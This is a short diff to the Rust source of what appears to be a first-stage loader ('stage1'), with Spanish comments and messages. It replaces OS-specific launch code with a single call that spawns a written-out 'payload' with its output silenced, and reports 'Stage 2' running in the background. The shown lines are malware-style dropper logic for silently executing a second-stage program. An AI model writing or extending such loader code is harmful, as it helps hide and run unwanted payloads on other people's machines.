@@ -1,3 +1,4 @@
+// stage1/src/main.rs (VERSIÓN FUNCIONAL CON SPAWN Y LOGS)
 use std::fs::{self, File};
 use std::io::Write;
 use std::process::Command;
@@ -52,25 +53,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
 
         println!("🚀 Ejecutando payload...");
-
-        // En macOS, usar "open" para dar contexto gráfico
-        #[cfg(target_os = "macos")]
-        {
-            Command::new("open")
-                .arg(&path)
-                .stdout(Stdio::null())
-                .stderr(Stdio::null())
-                .spawn()?;
-        }
-
-        // En Linux, ejecutar directamente
-        #[cfg(target_os = "linux")]
-        {
-            Command::new(&path)
-                .stdout(Stdio::null())
-                .stderr(Stdio::null())
-                .spawn()?;
-        }
+        Command::new(&path)
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn()?;
     }
 
     println!("✅ Stage 2 ejecutándose en background");
